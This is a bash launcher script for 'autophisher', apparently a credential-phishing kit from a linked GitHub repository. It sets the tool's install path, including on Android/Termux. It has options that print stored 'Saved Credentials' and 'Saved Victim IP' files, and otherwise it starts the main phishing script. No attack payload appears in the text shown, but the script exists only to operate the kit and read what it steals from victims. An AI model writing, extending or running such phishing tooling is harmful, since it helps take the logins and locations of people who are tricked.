#!/bin/bash

# https://github.com/CodingRanjith/autophisher

if [[ $(uname -o) == *'Android'* ]];then
	AUTOPHISHER_ROOT="/data/data/com.termux/files/usr/opt/autophisher"
else
	export AUTOPHISHER_ROOT="/opt/autophisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run autophisher type \`autophisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $AUTOPHISHER_ROOT/auth/usernames.dat 2> /dev/null || {
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $AUTOPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $AUTOPHISHER_ROOT
	bash ./autophisher.sh
fi
